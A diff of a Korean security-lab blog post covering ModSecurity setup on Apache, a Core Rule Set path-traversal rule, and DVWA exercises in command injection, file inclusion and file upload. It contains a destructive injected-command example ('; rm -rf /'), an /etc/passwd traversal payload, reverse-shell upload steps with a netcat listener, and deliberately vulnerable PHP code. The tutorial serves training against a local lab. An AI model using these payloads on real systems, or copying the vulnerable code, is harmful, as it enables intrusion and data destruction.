@@ -61,14 +61,10 @@ dvwa로 취약한 웹 어플리케이션 서버를 돌리고, modsecurity를 사
     # systemctl restart apache2
     ```
 만약 위 명령어를 입력했음에도 아파치가 실행되지 않는다면 다음 페이지를 참고하라
-https://askubuntu.com/questions/629995/apache-not-able-to-restart
+> [아파치 실행 에러](https://jisoo449.github.io/jisu_sec/sesac/2023/12/12/%EC%95%84%ED%8C%8C%EC%B9%98-%EC%8B%A4%ED%96%89-%EC%97%90%EB%9F%AC.html)
 
 ### 3. ModSecurity 설정
-- /etc/apache2/sites-avaliable/000-default.conf
-	- Apache 웹 서버에서 사이트의 구성을 정의하는 파일
-	- 특정 웹사이트/도메인에 대한 설정을 정의
-
-위 파일을 수정하여 통해 apache 웹사이트에 ModSecurity를 정의하자.
+`/etc/apache2/sites-avaliable`에는 `000-default.conf`라는 파일이 존재한다. 이는 Apache 웹 서버에서 사이트의 구성을 정의하는 파일로, 특정 웹사이트/도메인에 대한 설정을 정의하는 내용이 들어 있다. 아래 순서를 따라 `000-default.conf`파일을 수정하여 apache 웹사이트에 ModSecurity를 정의하자.
 1. cd /etc/apache2/sites-avaliable
 2. mosuepad 000-default.conf
 	파일의 맨 아래에 다음 코드 추가
@@ -76,19 +72,245 @@ https://askubuntu.com/questions/629995/apache-not-able-to-restart
     SecRuleEngine On
     SecRule ARGS:testparam "@contains test" "id:9999999,deny,status:403,msg:'TEST RULE'"
     ```
-3. systemctl restart apache2 입력
+3. systemctl restart apache2 입력  
 
-ModSecurity 환경 설정을 마쳤다. 
-이후 
--  `curl -X GET http://127.0.0.1/?testparam=test`를 cli에 입력 
-혹은 
-- `http://127.0.0.1/?testparam=test`를 브라우저에 입력
+
+위 과정을 통해 ModSecurity 환경 설정을 마쳤다. 이후  
+•`curl -X GET http://127.0.0.1/?testparam=test`를 cli에 입력  
+혹은  
+•`http://127.0.0.1/?testparam=test`를 브라우저에 입력  
 하면 *403 Forbidden*(접근 거부) 페이지를 확인할 수 있다. 
-![[Pasted image 20231212174644.png]]
+![403 forbidden image](https://jisoo449.github.io/jisu_sec/assets/images/post/403-forbidden.png)
 
 이는 위에서 추가한 규칙 중 `testparam "@contains test" ..."id:9999999,deny,... ` 에 해당하는 것이다. 
 testparam의 인자값으로 test가 입력되어 요청이 들어올 시 이를 deny하고, 403 상태값을 리턴하라는 규칙에 따라 testparam에 test를 넣으면 Forbidden된 결과값이 출력되는 것이다. 
 
 만약 위 인자값을 'test'를 제외한 아무 값이나 넣으면 정상적인 페이지가 리턴된다. 
-![[Pasted image 20231212174553.png]]
+![Apache success page](https://jisoo449.github.io/jisu_sec/assets/images/post/apache-browser.png)
 
+
+### 4. modsecurity 룰 확인
+modsecurity의 룰은 여러 방법으로 확인할 수 있다. 그 중 대표적으로 modsecurity.conf 파일을 확인하는 방법과 rules 디렉토리를 확인하는 방법이 있다. 
+룰은 conf 파일에서 개별로 추가하는 것이 아닌 rules 디렉토리에 있는 분류에 따라 추가하는 것이 권장된다.
+
+#### 4.1. 구성 파일
+- `/etc/modsecurity/modsecurity.conf` 에 위치
+- ModSecurity의 기본 동작, 로깅 수준, 데이터 처리 방법 등을 정의
+- 보안 규칙 자체는 미포함
+- ModSecurity의 전반적 동작 방식 설정  
+
+#### 4.2. CRS(Core Rule Set)
+- ModSecurity를 위한 기본적인 보안 규칙 모음이다. 
+- `/usr/share/modsecurity-crs/rules`에 위치
+- owsp와 관련된 다양한 rule set들이 존재하며, `{대문자}.conf` 의 네이밍 컨벤션을 가짐
+	![ModSecurity Rules](https://jisoo449.github.io/jisu_sec/assets/images/post/modsecurity-rules.png)   
+
+<br/>
+몇몇 conf파일을 살펴보며 rule에 익숙해져 보자. 
+```secrule
+파일명: REQUEST-930-APPLICATION-ATTACK-LFI.conf
+
+SecRule REQUEST_URI_RAW|ARGS|REQUEST_HEADERS|!REQUEST_HEADERS:Referer|XML:/* "@rx (?i)(?:\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:
+[19p]c|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[
+56]|002f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\/))(?:%(?:(?:f(?:(?:c%80|8)%8)?0%8|e)0%80%ae|2(?:(?:5(?:c0%25a|2))?e|%45)|u(?:(?:002|ff0)
+e|2024)|%32(?:%(?:%6|4)5|E)|c0(?:%[256aef]e|\.))|\.(?:%0[01]|\?)?|\?\.?|0x2e){2}(?:\x5c|(?:%(?:c(?:0%(?:[2aq]f|5c|9v)|1%(?:[19p]c
+|8s|af))|2(?:5(?:c(?:0%25af|1%259c)|2f|5c)|%46|f)|(?:(?:f(?:8%8)?0%8|e)0%80%a|bg%q)f|%3(?:2(?:%(?:%6|4)6|F)|5%%63)|u(?:221[56]|00
+2f|EFC8|F025)|1u|5c)|0x(?:2f|5c)|\/))" \
+    "id:930100,\
+    phase:2,\
+    block,\
+    capture,\
+    t:none,\
+    msg:'Path Traversal Attack (/../)',\
+    logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
+    tag:'application-multi',\
+    .
+```
+- 첫 번째 필드
+	- SecRule: 접두어. Security Rule임을 고지. 
+	- XML 뒤를 보면 `(?:^|[\\/])\.\.(?:[\\/]|$)`라는 문자열을 볼 수 있다. 이는 file:/// 로 시작되는 공격을 탐지한다는 것을 의미한다. 
+- 두 번째 필드
+	- REQUEST_URI_RAW : 무엇을 탐지할지에 대해 작성한 필드. 이 값과 같은 경우는 URI 값을 Raw로 확인하겠다는 의미이다. 이는 인코딩 때문이다. 표준화된 값으로 체크하기 위함이다. 
+	- ARGS : 변수를 체크하겠다.
+	- REQUEST_HEADERS: 사용자가 요청하는 헤더 필드를 검사
+	- !REQUEST_HEADERS:Referer : Refer라는 필드는 검사하지 않음
+	- XML:/* : XML 필드를 검사
+- 세 번째 필드
+	- "@rx (?i)(?:...)...))" : 탐지할 문자열. 
+		- LFI 공격은 보통 ../../../../../ 이나 file://// 등과 같은 방식으로 검증이 발생한다.
+	- !@rx: 해당 문자열로 시작해야 한다는 의미
+	- 괄호 : or
+	- ? : 특정 문자열이 와도 상관x
+- 네 번째 필드
+	- id:930100, : 룰에 대한 고유 식별값
+	- phase:2 : phase는 1부터 5까지 존재. 생략 가능. 각각의 플래그는 검사 범위를 나타낸다.
+						- 1: REQUEST_HEADER
+						- 2: 1+REQUEST_BODY
+						- 3: 2+RESPONSE_HEADER
+						- 4: 3+RESPONSE_BODY
+						- 5: 전체
+	- block : 차단을 나타내는 옵션. 실행 자체를 막는다. 이 외에도 deny라는 옵션도 존재한다. 
+	- capture : 패킷/로그 를 기록. 생략 가능
+	- t:none : 대소문자 구분/인코딩/디코딩 탐지 옵션. none은 default를 의미. 생략 가능. 
+			  룰 작성 시에는 대소문자/인코딩 데이터 등을 고려해야 한다.
+	- msg:'Path ...' : 탐지되었을 때 로그에 남길 메시지
+	- logdata: ... : 날짜. 생략 가능
+	- tag:'application-multi' : 식별 필드. 공격들을 그루핑하는 데 사용. 생략 가능
+
+
+### 5. 취약점 실습
+대표적인 웹 취약점 진단 항목으로는
+- 파라미터 변조
+- 게시글 입력
+- 프로세스 검증 : 시큐어 코딩으로 대비
+- 자동화 스캔  
+
+가 있다. 이 중 프로세스 검증은 개발 단계에서 보완해야 하는 부분이다. 프로세스 검증을 제외한 파라미터 변조, 게시글 입력, 자동화 스캔은 웹 방화벽(WAF)으로 검증이 가능하다. 
+
+웹에는 다양한 취약점이 존재한다. dvwa를 사용하여 웹 모의해킹을 실시하고, 웹의 취약점에 대해 알아보도록 하자.  
+
+이를 하기에 앞서 dvwa의 security level을 조정하여 실습에 알맞은 환경을 구성하자. 아래 순서에 따라 security level을 조정하라.    
+1. `etc/modsecurity/modsecurity.conf` 의 7번째 라인 `SecRuleEngine On`을 `Off`로 변경  
+2. `systemctl restart apache2`를 입력하여 시스템을 재시작  
+3. `dvwa-start` 입력하여 dvwa 시작  
+4. firefox에 접속하여 `127.0.0.1/dvwa` 혹은 `http://127.0.0.1:42001/index.php`로 접속  
+5. 왼쪽 바에서 DVWA Security 클릭  
+6. 하단 선택박스 impossible 에서 low로 변경 후 submit 
+
+#### 5.1. Command Injection
+>- 명령어 주입 공격
+>- 시스템에서 사용하는 명령어를 사용할 수 있는 환경  
+>- 취약점 발생 조건 : 소스코드 내 시스템 함수(exec, system, cmd, shell) 사용   
+
+Command Inection 페이지의 컴포넌트 하단의 View Source를 클릭하여 Command Injection 소스코드를 간단하게 살펴보자.   
+```php
+Command Injection Source
+vulnerabilities/exec/source/low.php
+
+<?php
+
+if( isset( $_POST[ 'Submit' ]  ) ) {
+    // Get input
+    $target = $_REQUEST[ 'ip' ]; 
+
+    // Determine OS and execute the ping command.
+    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+        // Windows
+        $cmd = shell_exec( 'ping  ' . $target );
+    }
+    else {
+        // *nix
+        $cmd = shell_exec( 'ping  -c 4 ' . $target );
+    }
+
+    // Feedback for the end user
+    echo "<pre>{$cmd}</pre>";
+}
+
+?>
+```
+1. `$target = $_REQUEST[ 'ip' ]; ` : 사용자가 입력한 ip값을 가져온다.  
+2.  `$cmd = shell_exec( 'ping  ' . $target ); ` : 웹서버의 cmd창에 사용자에게 입력받은 ip로 ping을 보내는 코드를 입력한다.  
+위의 상황에서 만약 사용자가 '8.8.8.8; rm -rf /'를 입력한다면 'rm -rf /' 가 실행되면서 서버의 모든 데이터가 삭제되는 보안 문제가 발생할 수 있다.   
+
+**Command Injection 취약점을 검증하는 방법은 기호를 사용하는 것이다.** 취약점 검증에 사용되는 기호는 아래 같다.  
+• `;` : 첫번째 명령어와 상관 없이 두번째 명령어 실행  
+• `|` : 첫번째 명령어 에러 발생 시 두번째 명령어 실행  
+• `||` : 첫번째 명령어 에러 발생 시 두번째 명령어 실행 안됨  
+• `&&` : 첫번째 명령어 실행 시 두번째 명령어 실행  
+
+*※주의! 입력되는 데이터의 인코딩 여부를 고려하라*  
+
+dvwa의 command injection 페이지로 이동하여 입력칸에 ;ls 를 입력 해 보자.  
+![DVWA command injection](https://jisoo449.github.io/jisu_sec/assets/images/post/dvwa-command-injection.png)
+위와 같이 명령어가 실행되어 위 페이지가 존재하는 디렉토리 내의 모든 파일이 출력된 것을 확인할 수 있다.  
+
+Command Injection 취약점은 네트워크 장비의 관리자 페이지(라우터, 스위치, 공유기 등)에서 자주 발견된다.(command injection은 일반적인 웹에서는 확인되지 않는다.) 따라서 Command Injection 취약점에 대한 보호는 WEB 서버 뿐만 아니라 모든 레벨(대역)에서 수행해야 한다. 
+
+#### 5.2. File Inclusion
+>- 파일 참조 공격
+>- 취약점 원인: include, locate, show, content, action 등의 함수에서 발생
+>- LFI(Local File Inclusion), RFI(Remote File Inclusion)로 나뉨
+
+공격 유형으로는 LFI와 RFI가 있다. 각각에 대해 취약점 검증을 해 보자  
+
+<br/>
+
+**LFI**  
+- 파라미터 인자값 입력 방식 공격  
+- `../../../../../`  이나 `file://` 의 형식을 사용해 특정 위치 파일 참조  
+- `?page=file1.php` 과 같은 **GET 요청 방식(쿼리스트링)은 취약점 확률이 높음.**  
+- 타겟 서버에 저장된 파일을 열람하는 수준에서 그침  
+- 취약점 확인 방법으로는 URL을 통한 확인방법과 소스코드를 통한 확인 방법이 있다.
+	- 취약점 확인 방법1. URL  
+		![URL을 통한 취약점 확인](https://jisoo449.github.io/jisu_sec/assets/images/post/url-lfi.png)
+		`http://127.0.0.1:42001/vulnerabilities/fi/?page=file1.php` 를 살펴보면 get 메소드에 의해 페이지가 실행되는 것을 확인할 수 있다.   
+	- 취약점 확인 방법2. 소스코드  
+		`$file = $_GET[ 'page' ];`는 HTTP GET 요청을 통해 전달된 'page'의 값을 '$file'에 할당한다는 의미이다. 즉, GET이 취약점임을 확인할 수 있다.
+		![Check LFI by source code](https://jisoo449.github.io/jisu_sec/assets/images/post/code-lfi.png)
+- 취약점 실습  
+	`http://127.0.0.1:42001/vulnerabilities/fi/?page=../../../../../etc/passwd` 를 입력하면 서버의 etc/passwd가 그대로 출력되는 것을 확인할 수 있다. 
+	![exposed pwd](https://jisoo449.github.io/jisu_sec/assets/images/post/exposed-pwd.png)  
+
+<br/>
+
+**RFI**
+- Request_Body 필드에 입력
+- http://~ 과 같은 원격지 주소로 취약점 점검
+- 공격자가 만들어둔 취약한 페이지를 타겟 시스템으로 임포트하여 실행 -> REC 공격으로 연계 가능
+- LFI가 확인된 곳에서라면 RFI도 확인 가능
+- 취약점 실습
+	`127.0.0.1:42001/vulnerabilities/fi/?page=http://google.com`를 url에 입력
+
+*※모든 공격들은 encoding을 신경써야 한다.
+
+#### 5.3. File Upload
+>- 게시판의 업로드 기능을 통해 악성 파일을 업로드하여 실행
+>- 취약점: 확장자 기반의 필터링, 헤더 정보에 컨텐츠 타입 필터링
+>- 취약점 검증: php, sh, html 등 확장자를 가지는 파일을 업로드 해 보면서 확인 
+>- FileUpload는 게시판 뿐만 아니라 통신 메소드(GET, POST, PUT, DELETE, OPTION)를 통해서도 강제 업로드 할 수 있다. 
+
+앞서 말했듯이 File Upload 공격은 게시판의 업로드 기능을 통해 악성 파일을 업로드하여 실행된다. 통신 메소드를 통해 공격이 시행되므로 다음과 같은 명령어를 사용해서 메소드 허용 여부를 확인한다.  
+• `curl -X OPTIONS -v http://127.0.0.1:42001/index.php`  
+• `curl -X OPTIONS -v http://vulnweb.com`  
+위 명령어를 통해서 확인할 수 있는 것은 PUT 메소드 허용 여부에 따라 발생하는 취약점이다. 다만 PUT 메소드가 허용되어 있어도 해당 디렉토리에 쓰기 권한이 활성화 되어 있지 않다면 사용할 수 없다.  
+이 외에도 다른 통신 메소드의 취약점을 확인하고 싶다면 각각의 통신 메소드가 요구하는 path 규격에 맞추어 url을 수정하면 된다. 이에 관련한 취약점 진단을 하려 한다면 일반적인 도메인 뿐만 아니라 서브 도메인까지 체크해야 한다. 
+
+1. `cd /home/kali/Desktop`
+2. `cp /usr/share/webshells/php/php-reverse-shell.php ./`
+3. `ip ad` 로 ip 확인
+4. `mousepad php-reverse-shell.php`
+5. 49, 50번째 라인을 3번에서 알아온 ip로 수정
+6. 브라우저 file upload로 가서 앞서 생성한 php-reverse-shell.php 업로드
+	`../../hackable/uploads/php-reverse-shell.php succesfully uploaded!` 와 같은 문장 출력됨. 
+	위에 나온 경로를 
+7. 다시 터미널로 돌아와서 `nc -lvnp {php파일에서 설정한 포트번호}`
+![Listening...](https://jisoo449.github.io/jisu_sec/assets/images/post/file-upload-listening.png)
+
+
+127.0.0.1:42001/hackable/uploads/php-reverse-shell.php 입력하면 아까 터미널에서 쉘 연결된 걸 확인 가능 
+
+파일 업로드 단계에서의 취약점 코드는 다음과 같다
+```php
+File Upload Source
+vulnerabilities/upload/source/low.php
+<?php
+
+if( isset( $_POST[ 'Upload' ] ) ) {
+    // Where are we going to be writing to?
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
+    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );
+
+    // Can we move the file to the upload folder?
+    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
+        // No
+        echo '<pre>Your image was not uploaded.</pre>';
+    }
+    else {
+        // Yes!
+        echo "<pre>{$target_path} succesfully uploaded!</pre>";
+    }
+}
+
+?> 
+```
